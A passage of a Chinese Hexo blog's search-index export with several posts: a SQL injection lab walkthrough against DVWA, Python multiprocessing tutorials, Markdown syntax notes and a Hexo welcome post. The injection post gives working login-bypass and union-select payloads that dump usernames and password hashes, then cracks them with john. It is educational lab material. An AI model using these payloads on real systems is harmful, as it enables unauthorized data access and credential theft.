    <content type="text"><![CDATA[SQL注入 所谓SQL注入，就是通过使用POST或GET方式把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 程序存在SQL注入，追其原因，就是代码或编码的不完善 如常见的用户登陆，举个简单的例子： 1SELECT * FROM users WHERE user='uname' AND password='pass' 一般情况下，通过布尔判断，只要SQL语句为真，即为登陆成功。这句SQL语句意思是查询users表中是否存在用户名为uname，密码为pass的用户，语句为真即登陆成功，语句为假即登陆失败。 若在不知道用户名和密码的情况下，我们可以将【pass】替换为【’ or 1=1 – 】 1SELECT * FROM users WHERE user='uname' AND password='' or 1=1 -- ' 注:【– 】 可以用来注释掉后边的语句。根据布尔判断，这句话就可以成真了，登陆成功 一些简单判断是否存在SQL注入的方法： 基于报错的检测方法(low) ‘ “ % ( ) 基于布尔的检测 1’ and ‘1’=’1 &emsp;或&emsp; 1’ and ‘1 1’ and ‘1’=’2 &emsp;或&emsp; 1’ and ‘0 表列数/显示信息位于哪一列 ‘ order by 9–+ #按查询列号 （如select * from table order by n 表示select里面的第n个字段） select * 时表字段数=查询字段数 联合查询 ‘ union select 1,2–+ ‘ union all select database(),2–+（联合查询前后语句的查询字段数要相等） 下面用metasploitable中的dvwa(low)进行演示这个提交表单作用是根据用户输入id ，返回用户的first_name、subname； 当我们不根据规则，输入一些不规范的数据，如“’”网页报错了，并返回了信息，可以判断是MySQL的数据库，错误原因是引号无法闭合。也可以利用布尔值判断当输入1’ and ‘1’=’1 ，语句为真，程序执行 ；1’ and ‘1’=’2 ，语句为假，程序不执行； 基于这些判断，就可以认为存在SQL注入现在可以猜解select中的字段个数，利用“order by”语句 可以从1开始（注意空格）当数值到3时，网页报错 “Unknown column ‘3’ in ‘order clause’”说明，查询的字段个数为2； 然后我们可以利用联合查询语句，查询一些有用的信息因为union查询前后查询字段个数要相等，这里用1，2代替，1，2也可以替换成一些函数 ‘ union select database(),substring_index(user(),”@”,1) – （字符串截取substring_index(str, “分隔符”，计数)）利用hackbar构造语句提交 常用可SQL查询内容： DB用户：user() DB版本：version() 全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os 当前库： database() ASCII转字符：char() 连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version()) 计算哈希：md5() Mysql 数据结构 information_schema 使用连接字符串函数查询（ascii码中，32为空格，58为冒号：） Mysql数据结构 对表的meta data的查询需要使用information_schema.tables， table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型MySQL：所有的元数据都保存在一张元数据表【information_schema】 查看所有库所有表/统计库中表的数量1' union select table_name,table_schema from information_schema.tables -- 查询所有数据库中的所有表 1' union select table_schema,count(*) from information_schema.tables group by table_schema -- 统计每个数据库中的表数量 Dvwa库中的表名1' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- 查询dvwa库的表 查询列名字段1' union select table_name,column_name from information_schema.columns where table_schema="dvwa" and table_name="users" -- 查询users表中的列名字段 查询表中数据1' union select user,password from dvwa.users -- 查询users表中的用户名、密码 到这里，用户名和密码都知道了，但是密码是加密过的，我们可以通过在线或离线的破解可以利用一些工具对密码使用的加密方式进行判断 1root@kali:/# hash-identifier 判断出来是md5哈希加密这里用离线破解的方式先将用户名密码保存至文件夹，格式如下用john进行破解 1root@kali:/# john --format=raw-MD5 dvwa.txt 如果出现以下错误，说明命令已经执行过了 123Using default input encoding: UTF-8Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])No password hashes left to crack (see FAQ) 命令执行后，会在“~”家目录里生成.john/的文件夹，里面有日志和破解后的明文文件要再执行，删除这两个文件即可]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程池Pool & 进程间通信Queue]]></title>
    <url>%2F2019%2F07%2F12%2F%E8%BF%9B%E7%A8%8B%E6%B1%A0Pool-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1Queue%2F</url>
    <content type="text"><![CDATA[进程池Pool当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。 初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，直到池中有进程结束，才会用之前的进程来执行新的任务，请看下面的实例： 1234567891011121314151617181920212223242526from multiprocessing import Poolimport osimport randomimport timedef worker(num): # for i in range(5): # print('---进程号: %d ---num=%d----'%(os.getpid(), num)) # time.sleep(1) print('---进程号: %d ---num=%d----'%(os.getpid(), num)) time.sleep(2)if __name__ == '__main__': pool = Pool(3) # 创建进程池， 进程数=3 for i in range(10): print("----添加任务：%d-----"%i) pool.apply_async(worker, (i,)) # 非堵塞式添加 # pool.apply(worker, (i,)) # 堵塞式添加 # 向进程池中添加任务数=10， 若添加的函数有参数，以元组的方式传入 pool.close() # 关闭进程池，不再添加新任务 pool.join() # 等待子进程都结束，主进程再结束 # 不然 主进程会在添加完任务后就结束 执行结果: 1234567891011121314151617181920----添加任务：0---------添加任务：1---------添加任务：2---------添加任务：3---------添加任务：4---------添加任务：5---------添加任务：6---------添加任务：7---------添加任务：8---------添加任务：9--------进程号: 13608 ---num=0-------进程号: 17324 ---num=1-------进程号: 2716 ---num=2-------进程号: 13608 ---num=3-------进程号: 17324 ---num=4-------进程号: 2716 ---num=5-------进程号: 13608 ---num=6-------进程号: 17324 ---num=7-------进程号: 2716 ---num=8-------进程号: 13608 ---num=9---- 非堵塞式添加和堵塞式添加阻塞与非阻塞指的是程序的两种运行状态 阻塞：遇到IO就发生阻塞，程序一旦遇到阻塞操作就会停在原地，并且立刻释放CPU资源 非阻塞（就绪态或运行态）：没有遇到IO操作，或者通过某种手段让程序即便是遇到IO操作也不会停在原地，执行其他操作，力求尽可能多的占有CPU pool.apply 和 pool.apply_async 的区别 apply ：阻塞式，需要等待当前子进程执行完毕后，在执行下一个子进程，耗时长。 apply_async ： 非阻塞式，async是异步的意思，不用等待当前运行的子进程执行完毕，随时根据系统调度来进行进程切换，耗时短。 进程间通信QueueProcess之间有时需要通信，操作系统提供了很多机制来实现进程间的通信。multiprocessing模块的Queue实现多进程之间的数据传递，Queue本身是一个消息列队程序 Queue的使用在内存中开辟一个队列模型，用来存放消息，任何拥有队列对象的进程都可以进行消息存放和取出 初始化Queue()对象时（例如：q=Queue()），若括号中没有指定最大可接收的消息数量，或数量为负值，那么就代表可接受的消息数量没有上限（直到内存的尽头）； Queue.qsize()：返回当前队列包含的消息数量； Queue.empty()：如果队列为空，返回True，反之False ； Queue.full()：如果队列满了，返回True,反之False； Queue.get([block[,timeout]]):获取队列中的一条消息，然后将其从列队中移除，block默认值为True； 1)如果block使用默认值，且没有设置timeout（单位秒），消息列队如果为空，此时程序将被阻塞（停在读取状态），直到从消息列队读到消息为止，如果设置了timeout，则会等待timeout秒，若还没读取到任何消息，则抛出”Queue.Empty”异常； （如 Queue.get(block=True,timeout=2)） 2）如果block值为False，消息列队如果为空，则会立刻抛出”Queue.Empty”异常； Queue.put(item,[block[, timeout]])：将item消息写入队列，block默认值为True； 1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果已经没有空间可写入，此时程序将被阻塞（停在写入状态），直到从消息列队腾出空间为止，如果设置了timeout，则会等待timeout秒，若还没空间，则抛出”Queue.Full”异常；（如 Queue.put(‘xxx’block=True,timeout=2)） 2）如果block值为False，消息列队如果没有空间可写入，则会立刻抛出”Queue.Full”异常； Queue.get_nowait()：相当Queue.get(False)； Queue.put_nowait(item)：相当Queue.put(item, False)； Queue实例在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据： 1234567891011121314151617181920212223242526272829303132from multiprocessing import Process, Queueimport os, timedef write_data(queue): for value in ['Message1', 'Message2', 'Message3']: print("Put %s to queue..." %value) queue.put(value) # 加入消息队列 time.sleep(2)def read_data(queue): while True: if not queue.empty(): # 判断消息队列是否为空 value = queue.get(True) # 默认值为True，获取消息队列中的一个值 print("Get %s to queue..." %value) time.sleep(2) else: breakif __name__ == '__main__': # 当前父进程创建Queue,供两个子进程读写 q = Queue() # 初始化队列 ，未传入参数时，即可不受限制接受消息 pw = Process(target=write_data, args=(q,)) # 创建写进程 pr = Process(target=read_data, args=(q,)) # 创建读进程 # 写进程pw开启 pw.start() # 等待写进程pw结束 pw.join() # 读进程pr开启 pr.start() # 等待度进程pr结束 pr.join() print("...Done") 执行结果： 1234567Put Message1 to queue...Put Message2 to queue...Put Message3 to queue...Get Message1 to queue...Get Message2 to queue...Get Message3 to queue......Done 进程池通信Queue如果要使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()，而不是multiprocessing.Queue()，否则会得到一条如下的错误信息： RuntimeError: Queue objects should only be shared between processes through inheritance. 下面的实例演示了进程池中的进程如何通信： 123456789101112131415161718192021222324from multiprocessing import Manager, Poolimport os, timedef reader(queue): print("reader启动(%s),父进程为(%s)"%(os.getpid(),os.getppid())) for i in range(queue.qsize()): print("reader从Queue获取到消息：%s "% queue.get(True)) def writer(queue): print("writer启动(%s),父进程为(%s)"%(os.getpid(),os.getppid())) for i in ['Message1', 'Message2', 'Message3', 'Message4']: queue.put(i)if __name__ == '__main__': print("(%s) start"%os.getpid()) q = Manager().Queue() #使用Manager中的Queue来初始化 po = Pool() #使用阻塞模式创建进程，这样就不需要在reader中使用死循环了，可以让writer完全执行完成后，再用reader去读取 po.apply(writer,(q,)) po.apply(reader,(q,)) po.close() po.join() print("(%s) End"%os.getpid()) 执行结果： 12345678(12196) startwriter启动(6812),父进程为(12196)reader启动(7992),父进程为(12196)reader从Queue获取到消息：Message1reader从Queue获取到消息：Message2reader从Queue获取到消息：Message3reader从Queue获取到消息：Message4(12196) End]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python创建进程的三种方式]]></title>
    <url>%2F2019%2F07%2F09%2FPython%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[python创建进程的三种方式 fork创建 multiprocessing 模块 Process类 继承Process类, 子类创建 1.fork创建os.fork方法会创建出一个子进程，原进程（父进程）返回一个大于零的值（即ret &gt; 0），这个值恰好是子进程的pid；而创建的新的子进程返回的值为零（即ret = 0）fork方法创建进程不适用于window系统，window系统中没有这个系统调用 1234567891011import osret = os.fork() if ret == 0: #子进程 print("Sub process pid = %d, Sub process ppid = %d" % (os.getpid(), os.getppid()))else: #父进程 print("Parent Process ret = %d" % ret) print("Parent Process pid = %d" % os.getpid()) 执行效果: 123Parent Process ret = 2757Parent Process pid = 2756Sub process pid = 2757, Sub process ppid = 2756 2.multiprocessing 模块 Process类通过Multiprocessing模块中的Process类,创建Process对象,target参数传入的是子进程执行的函数戴码, 通过start方法开启子进程 123456789101112131415161718from multiprocessing import Processimport timeimport osdef test(): time.sleep(2) print('子进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) if __name__ == '__main__': p = Process(target=test) p.start() p.join(3) # （堵塞）等待子进程结束，再执行父进程 join(timout) 超时时间 # 传入 1s 父进程等待1s，若超过1秒，子进程未结束，父进程先运行 # 传入3s 等待时间未结束，子进程结束，父进程运行 # 如果没有传入参数 父进程只有等待子进程结束，再运行 print('父进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) 注:fork方法创建的进程，主进程不会等待子进程结束再结束Process类创建的进程，默认情况主进程会等待子进程都结束，再结束 3.继承Process类, 子类创建创建一个子类, 继承Process类, 重写run方法, 实例出一个对象, 调用start方法运行子进程,调用start方法，会自动调用run方法 1234567891011121314151617from multiprocessing import Processimport timeimport osclass NewProcess(Process): #继承Process类 def run(self): # 重写run方法 while True: print('子进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) time.sleep(1)if __name__ == '__main__': p = NewProcess() # 实例化一个子进程对象 p.start() # 运行子进程的代码(即run方法) while True: print('父进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) time.sleep(1)]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的第一篇博客]]></title>
    <url>%2F2019%2F06%2F30%2F%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[这是我的第一篇博客 Markdown常用的语法 Markdown常用语法1.标题 1234567语法:# 一级标题## 二级标题### 三级标题#### 四级级标题##### 五级标题###### 六级标题 2.字体 1加粗: *字体* 效果: 字体 1斜体: **字体** 效果: 字体 1斜体加粗: ***字体*** 效果: 字体 1删除线: ~~字体~~ 效果: 字体 3.代码格式 编程语言可以更换格式: 效果： 1print("hello,world~"); 4.插入图片 在根目录sourse文件夹里创建一个images文件夹, 将图片放在 source/images/ 下 1格式: ![image](/images/xxx.jpg) 效果如下: 5.引用 在引用的文字前加&gt;，可以无限加… 1引用: &gt; 效果: 引用 引用 引用 引用 6.分割线 三个或者三个以上的 - 或者 * 都可以 1格式: ---或*** 7.超链接 12格式:[超链接名](超链接地址 "超链接title") 效果:百度淘宝 8.列表 1234无序列表: * 这是一个列表 + 这是一个列表 - 这是一个列表 效果: 这是一个列表 这是一个列表 这是一个列表 12345有序列表: 1. 这是一个列表 2. 这是一个列表 3. 这是一个列表 4. 这是一个列表 效果: 这是一个列表 这是一个列表 这是一个列表 这是一个列表 9.表格 表格内容对齐方式: -： 左对齐:-: ： 居中对齐-: ： 右对齐 123456格式: 表头1 | 表头2 | 表头3 | 表头4 - | :- | :-: | -: | 默认左对齐|左对齐|居中对齐|右对齐 默认左对齐|左对齐|居中对齐|右对齐 默认左对齐|左对齐|居中对齐|右对齐 效果: 表头1 表头2 表头3 表头4 默认左对齐 左对齐 居中对齐 右对齐 默认左对齐 左对齐 居中对齐 右对齐 默认左对齐 左对齐 居中对齐 右对齐 10.全文阅读在文章要不显示的部分前，添加以下内容 1格式: &lt;!-- more --&gt; markdown语法进阶1.字体、大小、颜色123456789语法:&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt; &lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;/font&gt; &lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt; &lt;font color=red&gt;我是红色&lt;/font&gt; &lt;font color=#008000&gt;我是绿色&lt;/font&gt; &lt;font color=Blue&gt;我是蓝色&lt;/font&gt; &lt;font size=5&gt;我是尺寸&lt;/font&gt; &lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt; 我是黑体字我是微软雅黑我是华文彩云我是红色我是绿色我是蓝色我是尺寸我是黑体，绿色，尺寸为5 2.文字背景1&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;文字背景&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 文字背景]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>导航</tag>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F06%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
